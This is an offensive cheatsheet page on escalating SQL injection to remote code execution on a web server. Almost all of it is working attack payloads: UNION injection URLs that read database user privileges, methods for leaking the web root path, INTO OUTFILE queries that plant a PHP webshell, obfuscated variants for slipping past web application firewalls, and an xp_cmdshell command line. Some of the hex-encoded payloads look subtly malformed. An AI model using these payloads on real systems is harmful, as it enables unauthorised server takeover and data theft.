# SQL Privilege Escalation

## Identifying the write user's permission
If the database user has write permission, it allows an attacker to upload arbitrary files in the server.  

Let's suppose that the website has 12 columns and the given UNION Based SQL query shows that the vulnerable column is 4:  
```http://domain.com/index.php?id=1' Union Select 1,2,3,4,5,6,7,8,9,10,11,12-- -```

Payload used for Privilege Check via I_S.PRIVILEGES:  
```(SELECT+GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e)+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES)```

Payload used for Privilege Check via MySQL System Table:  
```(SELECT+GROUP_CONCAT(user,0x202d3e20,file_priv,0x3c62723e)+FROM+mysql.user)```

Apply one of the queries into the 4th column:  
```http://domain.com/index.php?id=1' Union Select 1,2,3,(SELECT+GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e)+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES),5,6,7,8,9,10,11,12-- -```

Look into the results, if 'root'@'localhost' is YES, then we can perform Privilage Escalation (perform RCE). Else, if NO is shown we can't perform RCE since we don't have permission to write over the server.

## Escalating privileges

Since we have permission to write, we can create our own PHP Webshell, but to do this we need to know the absolute path of INDEX.

### Finding absolute path

1. The most common way to find a path, is by searching the temporary path that SQL has, to do that we simply use the following query:
```sql
@@slave_load_tmpdir
```

Look at the output, you should look after a directory, something like this:
**/var/mysqltmp**  

This means that we can upload files to **/mysqltmp**

2. Another way (when website likes to Error) is to perform a 'Fatal Error' or a Syntax Error and the absolute path will be shown bolded like the image below.
Note: different websites displayes different output and format.

![fatal_error_syntax](https://i.imgur.com/rAPKrh1.png)

The bold part is the absolute path: **E:\xampp\htdocs** which is converted to **E:/xampp/htdocs**

### Uploading webshell

Let's use the following PHP code to inject it into an arbitrary file:
```php
<?php system($_GET[‘cmd’]); ?>
```

Below is the PHP script converted to 0xHEX format:  
```0xa3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e```

The following queries (same goal, different approach) is to inject this php code into an arbitrary file which we will name it **webshell.php** (for this part you MUST assume/know the absolute path of the file you want to upload, otherwise it won't work. Hint: use [@@slave_load_tmpdir](https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/edit/main/Privilege%20Escalation/README.md#finding-absolute-path) to find the temporary directory located in the server).  

```sql
http://domain.com/index.php?id=1' Union Select 1,2,3,0x201c3c3f7068702073797374656d28245f4745545b2018636d6420195d293b203f3e201d,5,6,7,8,9,10,11,12 into outfile 'E:/xampp/htdocs/webshell.php'-- -
```  
```sql
http://domain.com/index.php?id=1' Union Select 1,2,3,"<?php system($_GET['cmd']); ?>",5,6,7,8,9,10,11,12 into outfile "C:\\xampp\\htdocs\\webshell.php'-- -
```  
```sql
http://domain.com/index.php?id=1' Union Select '' into outfile '/var/www/html/webshell.php' FIELDS TERMINATED BY "<?php system($_GET['cmd']); ?>"
```  

If WAF comes into the play and makes it unable for you to upload webshell, try using the following concat() functions to load the PHP script:
```sql
unhex(hex(/*!50000group_concat*/(/*!500000x201c3c3f7068702073797374656d28245f4745545b2018636d6420195d293b203f3e201d*/)))  
%0AcOnCat(0x201c3c3f7068702073797374656d28245f4745545b2018636d6420195d293b203f3e201d)  
/**//*!12345cOnCat*/(0x201c3c3f7068702073797374656d28245f4745545b2018636d6420195d293b203f3e201d)  
unhex(hex(/*!12345concat*/(0x201c3c3f7068702073797374656d28245f4745545b2018636d6420195d293b203f3e201d)))  
```

Since the webshell is upload, you can go execute OS Commands:

```http://domain.com/webshell.php?cmd=whoami```

## OS Command Execution

Via **xp_cmdshell**:  
```something'); exec xp_cmdshell "ping 10.10.x.x"--``` 
